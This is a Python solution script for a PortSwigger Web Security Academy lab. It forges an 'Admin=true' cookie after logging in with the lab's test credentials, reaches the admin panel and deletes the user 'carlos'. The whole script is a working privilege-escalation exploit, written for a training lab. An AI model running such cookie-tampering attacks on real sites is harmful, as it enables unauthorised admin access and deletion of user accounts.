# User role controlled by request parameter
# https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter

import requests
from bs4 import BeautifulSoup

site="https://xxxxx.web-security-academy.net/"

# Login and fetch cookies for user 'weiner'
if "https" in site:
  site = site.rstrip("/").lstrip("https://")

s = requests.Session()

login_url = f"https://{site}/login"
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,"html.parser")

csrf = soup.find("input",{"name":"csrf"}).get("value")

logindata ={
  "csrf":csrf,
  "username":"wiener",
  "password":"peter",
}

resp = s.post(login_url,data=logindata)
input(f"Logged in with cookies \n{s.cookies}...\nNeed to tamper admin setting\n")

# Create a malicious cookie with Admin=true to act as admin user
cookie_obj = requests.cookies.create_cookie(domain=site,name="Admin",value="true")
s.cookies.set_cookie(cookie_obj)

url = f"https://{site}/admin"
input(f"Tampered cookies are:\n {s.cookies}\nRetrieved the admin link now at {url}:\n")
resp = s.get(url)
print("---Admin Panel exposing delete carlos link ---")

#Fetch link in admin panel to delete user carlos
soup = BeautifulSoup(resp.text,"html.parser")
carlos_delete_link = [link for link in soup.find_all("a") if "carlos" in link.get("href")]

delete_uri = carlos_delete_link[0]["href"]
delete_url = f"https://{site}{delete_uri}"

print(delete_url)
print("--------------------------------")
input(f"Hit delete url at {delete_url} ?")
resp = s.get(delete_url)
print("--------------------------------")
